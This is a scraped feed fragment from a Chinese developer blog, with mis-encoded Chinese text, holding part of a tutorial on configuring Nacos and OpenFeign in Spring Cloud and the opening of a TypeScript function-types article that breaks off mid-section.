  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T15:52:15.000Z" title="Wed Jan 07 2026 15:52:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">Nacos</h3>
<h4 data-id="heading-1">ä¸‹è½½å®‰è£…</h4>
<ul>
<li>ä¸‹è½½ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falibaba%2Fnacos%2Ftags" target="_blank" title="https://github.com/alibaba/nacos/tags" ref="nofollow noopener noreferrer">github.com/alibaba/nacâ€¦</a></li>
<li>å¯åŠ¨ï¼š<code>startup.cmd -m standalone</code></li>
<li>è®¿é—®ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8848%2Fnacos%2F" target="_blank" title="http://localhost:8848/nacos/" ref="nofollow noopener noreferrer">http://localhost:8848/nacos/</a>     è´¦å·å¯†ç ï¼šnacos</li>
</ul>
<h4 data-id="heading-2">åŸºç¡€æ¦‚å¿µ</h4>
<ul>
<li>nacosé…ç½®ä¸­å¿ƒé€šè¿‡<code>namespace</code>ã€<code>group</code> å’Œ <code>dataId</code> æ¥å”¯ä¸€ç¡®å®šä¸€æ¡é…ç½®ï¼Œ</li>
<li>dataIdçš„æ ¼å¼ï¼š<code>${prefix}-${spring.profiles.active}.${file-extension}</code>
<ul>
<li><code>prefix</code>ï¼šé»˜è®¤ä¸º<code>spring.application.name</code></li>
<li><code>spring.profiles.active</code>ï¼šå½“å‰æ¿€æ´»çš„ç¯å¢ƒï¼Œå½“<code>spring.profiles.active</code>ä¸ºç©ºæ—¶ï¼Œå¯¹åº”çš„è¿æ¥ç¬¦<code>-</code>ä¹Ÿå°†ä¸å­˜åœ¨ï¼ŒdataIdçš„æ‹¼æ¥æ ¼å¼å˜ æˆï¼š<code>${prefix}.${file-extension}</code></li>
<li><code>${file-extension}</code>ï¼šé»˜è®¤ä¸º<code>properties</code></li>
</ul>
</li>
<li>æ‹‰å–å¤šä¸ªå…±äº«æ–‡ä»¶ï¼Œè¦åœ¨åŒä¸€å‘½åç©ºé—´ä¸‹ï¼Œä¸èƒ½è·¨å‘½åç©ºé—´</li>
<li>æ³¨æ„springbootå’Œspringcloudçš„ç‰ˆæœ¬å¯¹åº”</li>
</ul>
<h4 data-id="heading-3">é…ç½®ä¸­å¿ƒ</h4>
<ul>
<li>
<p>å¼•å…¥ä¾èµ–</p>
<pre><code class="hljs language-java" lang="java">&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-bootstrap&lt;/artifactId&gt;
    &lt;version&gt;<span class="hljs-number">4.1</span><span class="hljs-number">.5</span>&lt;/version&gt;
&lt;/dependency&gt;
    
&lt;dependency&gt;
    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;
    &lt;version&gt;<span class="hljs-number">2021.0</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
</li>
<li>
<p>å®Œæ•´<code>bootstrap.properties</code>é…ç½®ï¼š</p>
<pre><code class="hljs language-properties" lang="properties">spring.application.name=testccb
spring.cloud.nacos.config.username=nacos
spring.cloud.nacos.config.password=nacos
spring.cloud.nacos.config.server-addr=192.168.1.211:8848
spring.cloud.nacos.config.namespace=4f4b-363e-47a5-8a-dbd288c
spring.cloud.nacos.config.group=com.iotsh

# æ‹‰å–å…±äº«çš„é…ç½®
spring.cloud.nacos.config.extension-configs[0].data-id=testccb.properties
spring.cloud.nacos.config.extension-configs[0].group=ccb
spring.cloud.nacos.config.extension-configs[0].refresh=true
</code></pre>
</li>
</ul>
<h4 data-id="heading-4">æ³¨å†Œä¸­å¿ƒ</h4>
<ul>
<li>
<p>å¼•å…¥ä¾èµ–</p>
<pre><code class="hljs language-java" lang="java">&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-bootstrap&lt;/artifactId&gt;
    &lt;version&gt;<span class="hljs-number">4.1</span><span class="hljs-number">.5</span>&lt;/version&gt;
&lt;/dependency&gt;

&lt;dependency&gt;
    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;
    &lt;version&gt;<span class="hljs-number">2021.0</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
</li>
</ul>
<ul>
<li>
<p>é…ç½®æ–‡ä»¶</p>
<pre><code class="hljs language-properties" lang="properties">spring.cloud.nacos.discovery.server-addr=192.168.1.211:8848
spring.cloud.nacos.discovery.username=nacos
spring.cloud.nacos.discovery.password=nacos
spring.cloud.nacos.discovery.namespace=ed4b94b3-deff-49f1-8973-34029756083d
</code></pre>
</li>
<li>
<p>ä¸»å¯åŠ¨ç±»ï¼š<code>@EnableDiscoveryClient</code></p>
</li>
</ul>
<h3 data-id="heading-5">OpenFeign</h3>
<ul>
<li>
<p>å¼•å…¥ä¾èµ–</p>
<pre><code class="hljs language-properties" lang="properties">&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
    &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
</li>
<li>
<p>ä¸»å¯åŠ¨ç±»ï¼š<code>@EnableFeignClients </code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@EnableDiscoveryClient</span>
<span class="hljs-meta">@EnableFeignClients</span> 
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EurekaClientApplication</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        SpringApplication.run(CategoryApplication.class,args);
    }
}
</code></pre>
</li>
<li>
<p>é…ç½®æ–‡ä»¶</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">feign:</span>
  <span class="hljs-attr">client:</span>
    <span class="hljs-attr">config:</span>
      <span class="hljs-attr">default:</span>
        <span class="hljs-attr">connect-timeout:</span> <span class="hljs-number">5000</span>
        <span class="hljs-attr">read-timeout:</span> <span class="hljs-number">5000</span>
</code></pre>
</li>
<li>
<p>åˆ›å»º<code>FeignClient</code> (è°ƒç”¨è€…)ï¼Œæ³¨æ„ä¼ å‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FeignClient(value = "product")</span> <span class="hljs-comment">// è¢«è°ƒç”¨çš„æœåŠ¡åç§°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ProductClient</span> {
    
    <span class="hljs-meta">@RequestMapping("/status")</span> <span class="hljs-comment">// è¢«è°ƒç”¨çš„æœåŠ¡æ¥å£</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">status</span><span class="hljs-params">()</span>;

    <span class="hljs-meta">@GetMapping("/paramRequest")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">paramRequest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam("id")</span> Integer id, <span class="hljs-meta">@RequestParam("name")</span> String name)</span>;

    <span class="hljs-meta">@PostMapping("/bodyRequest")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">bodyRequest</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> User user)</span>;
}
</code></pre>
</li>
<li>
<p>Controllerä¸­ä½¿ç”¨</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductClient productClient;  

    <span class="hljs-meta">@GetMapping("/find")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">find</span><span class="hljs-params">()</span>{
        <span class="hljs-keyword">return</span> productClient.status();
    }
}
</code></pre>
</li>
</ul>
<ul>
<li>
<p>è¢«è°ƒç”¨çš„æœåŠ¡</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductController</span> {
    <span class="hljs-comment">// æ²¡æœ‰å‚æ•°</span>
    <span class="hljs-meta">@RequestMapping("/status")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">status</span><span class="hljs-params">()</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">"client b is ok!"</span>;
    }

    <span class="hljs-comment">// paramå‚æ•°</span>
    <span class="hljs-meta">@GetMapping("/paramRequest")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">paramRequest</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam("id")</span> Integer id, <span class="hljs-meta">@RequestParam("name")</span> String name)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">"paramRequest method is ok!, id:"</span> + id +<span class="hljs-string">", name:"</span>+ name;
    }

    <span class="hljs-comment">// bodyæœ‰å‚æ•°</span>
    <span class="hljs-meta">@PostMapping("/bodyRequest")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">bodyRequest</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> User user)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-string">"bodyRequest method is ok!, user:"</span> + user.toString();
    }
}
</code></pre>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScriptå‡½æ•°ç±»å‹å…¨æ”»ç•¥ï¼šä»åŸºç¡€çº¦æŸåˆ°é«˜çº§ç©æ³•]]></title>    <link>https://juejin.cn/post/7592455394062368806</link>    <guid>https://juejin.cn/post/7592455394062368806</guid>    <pubDate>2026-01-07T13:26:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592455394062368806" data-draft-id="7592424951661428762" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScriptå‡½æ•°ç±»å‹å…¨æ”»ç•¥ï¼šä»åŸºç¡€çº¦æŸåˆ°é«˜çº§ç©æ³•"/> <meta itemprop="keywords" content="TypeScript"/> <meta itemprop="datePublished" content="2026-01-07T13:26:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¦‚æœä½ å¥½"/> <meta itemprop="url" content="https://juejin.cn/user/2272012281328215"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScriptå‡½æ•°ç±»å‹å…¨æ”»ç•¥ï¼šä»åŸºç¡€çº¦æŸåˆ°é«˜çº§ç©æ³•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2272012281328215/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¦‚æœä½ å¥½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T13:26:20.000Z" title="Wed Jan 07 2026 13:26:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TypeScriptå‡½æ•°ç±»å‹å…¨æ”»ç•¥ï¼šä»åŸºç¡€çº¦æŸåˆ°é«˜çº§ç©æ³•</h2>
<p>å‡½æ•°æ˜¯TypeScriptä¸­æœ€æ ¸å¿ƒçš„å¤ç”¨å•å…ƒï¼Œä¹Ÿæ˜¯ç±»å‹çº¦æŸçš„é«˜é¢‘åœºæ™¯ã€‚å¾ˆå¤šå¼€å‘è€…åªä¼šç»™å‡½æ•°åŠ ç®€å•çš„å‚æ•°/è¿”å›å€¼ç±»å‹ï¼Œå´å¿½ç•¥äº†å¯é€‰å‚æ•°ã€readonlyå‚æ•°ã€é«˜é˜¶å‡½æ•°ç­‰å®ç”¨ç‰¹æ€§ã€‚æœ¬æ–‡ä¼šä»åŸºç¡€åˆ°è¿›é˜¶ï¼ŒæŠŠTSå‡½æ•°ç±»å‹çš„æ ¸å¿ƒçŸ¥è¯†ç‚¹è®²é€ï¼Œè¦†ç›–æ—¥å¸¸å¼€å‘æ‰€æœ‰åœºæ™¯ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€åŸºç¡€æ ¸å¿ƒï¼šFunctionç±»å‹ä¸å‡½æ•°ç±»å‹è¡¨è¾¾å¼</h3>
<p>TSä¸­æè¿°å‡½æ•°ç±»å‹æœ‰ä¸¤ç§æ ¸å¿ƒæ–¹å¼ï¼š<code>Function</code> ç±»å‹ï¼ˆå®½æ³›ï¼‰å’Œ**å‡½æ•°ç±»å‹è¡¨è¾¾å¼ï¼Œå…ˆåˆ†æ¸…è¿™ä¸¤ç§å†™æ³•çš„åŒºåˆ«ã€‚</p>
<h4 data-id="heading-2">1. Functionç±»å‹ï¼ˆä¸æ¨èï¼‰</h4>
<p><code>Function</code> æ˜¯TSçš„å†…ç½®ç±»å‹ï¼Œä»£è¡¨â€œä»»æ„å‡½æ•°â€ï¼Œä½†å®ƒè¿‡äºå®½æ³›ï¼Œä¼šä¸¢å¤±ç±»å‹çº¦æŸçš„æ„ä¹‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®½æ³›çš„Functionç±»å‹ï¼šèƒ½æ¥æ”¶ä»»ä½•å‡½æ•°ï¼Œä½†æ— æ³•çº¦æŸå‚æ•°/è¿”å›å€¼</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">fn</span>: <span class="hljs-title class_">Function</span>;
fn = <span class="hljs-function">() =&gt;</span> <span class="hljs-number">123</span>; <span class="hljs-comment">// ä»»æ„å‡½æ•°éƒ½èƒ½èµ‹å€¼</span>
fn = <span class="hljs-function">(<span class="hljs-params">a: <span class="hljs-built_in">string</span></span>) =&gt;</span> a; <span class="hljs-comment">//  æ— ç±»å‹æ£€æŸ¥</span>
<span class="hljs-title function_">fn</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>); <span class="hljs-comment">//è°ƒç”¨æ—¶å‚æ•°ä»»æ„ï¼Œæ— æŠ¥é”™</span>
</code></pre>
<p><strong>ç¼ºç‚¹</strong>ï¼šæ— æ³•çº¦æŸå‚æ•°ä¸ªæ•°ã€ç±»å‹å’Œè¿”å›å€¼ï¼Œç›¸å½“äºå¼±åŒ–äº†TSçš„ç±»å‹æ£€æŸ¥ï¼Œä»…é€‚åˆå®Œå…¨ä¸ç¡®å®šå‡½æ•°ç»“æ„çš„æç«¯åœºæ™¯ã€‚</p>
<h4 data-id="heading-3">2. å‡½æ•°ç±»å‹è¡¨è¾¾å¼ï¼ˆæ¨èï¼‰</h4>
<p>ç”¨ <code>(å‚æ•°: ç±»å‹) =&gt; è¿”å›å€¼ç±»å‹</code> çš„è¯­æ³•ï¼Œç²¾å‡†æè¿°å‡½æ•°ç»“æ„ï¼Œæ˜¯æ—¥å¸¸å¼€å‘çš„é¦–é€‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å®šä¹‰ç²¾å‡†çš„å‡½æ•°ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">AddFunc</span> = <span class="hljs-function">(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>) =&gt;</span> <span class="hljs-built_in">number</span>;

<span class="hljs-comment">// èµ‹å€¼ï¼šå¿…é¡»ä¸¥æ ¼åŒ¹é…å‚æ•°å’Œè¿”å›å€¼ç±»å‹</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">add</span>: <span class="hljs-title class_">AddFunc</span> = <span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x + y; <span class="hljs-comment">//  æ­£ç¡®</span>
<span class="hljs-comment">// const add2: AddFunc = (x: string, y: string) =&gt; x + y; //  æŠ¥é”™ï¼šå‚æ•°ç±»å‹ä¸åŒ¹é…</span>
</code></pre>
<h3 data-id="heading-4">äºŒã€å‚æ•°è¿›é˜¶ï¼šå¯é€‰/é»˜è®¤/è§£æ„/rest/åªè¯»å‚æ•°</h3>
<p>å‡½æ•°å‚æ•°çš„çº¦æŸæ˜¯TSå‡½æ•°ç±»å‹çš„æ ¸å¿ƒï¼ŒæŒæ¡ä»¥ä¸‹5ç§å‚æ•°ç±»å‹ã€‚</p>
<h4 data-id="heading-5">1. å¯é€‰å‚æ•°ï¼ˆ?ï¼‰</h4>
<p>ç”¨ <code>?</code> æ ‡è®°å‚æ•°ï¼Œè¡¨ç¤ºâ€œå¯ä¼ å¯ä¸ä¼ â€ï¼Œ<strong>å¿…é¡»æ”¾åœ¨å¿…é€‰å‚æ•°ä¹‹å</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// messageæ˜¯å¯é€‰å‚æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, message?: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> message ? <span class="hljs-string">`<span class="hljs-subst">${message}</span>, <span class="hljs-subst">${name}</span>`</span> : <span class="hljs-string">`Hello, <span class="hljs-subst">${name}</span>`</span>;
}

<span class="hljs-title function_">greet</span>(<span class="hljs-string">"å¼ ä¸‰"</span>); <span class="hljs-comment">//  æ­£ç¡®ï¼Œè¿”å› "Hello, å¼ ä¸‰"</span>
<span class="hljs-title function_">greet</span>(<span class="hljs-string">"æå››"</span>, <span class="hljs-string">"æ—©ä¸Šå¥½"</span>); <span class="hljs-comment">//  æ­£ç¡®ï¼Œè¿”å› "æ—©ä¸Šå¥½, æå››"</span>
<span class="hljs-comment">// greet(undefined, "Hi"); //  æŠ¥é”™ï¼šå¿…é€‰å‚æ•°nameä¸èƒ½çœç•¥</span>
</code></pre>
<h4 data-id="heading-6">2. å‚æ•°é»˜è®¤å€¼</h4>
<p>å‚æ•°å¸¦é»˜è®¤å€¼æ—¶ï¼Œè‡ªåŠ¨æˆä¸ºå¯é€‰å‚æ•°ï¼Œç±»å‹ä¼šæ ¹æ®é»˜è®¤å€¼æ¨å¯¼ï¼ˆä¹Ÿå¯æ˜¾å¼çº¦æŸï¼‰ï¼š</p>
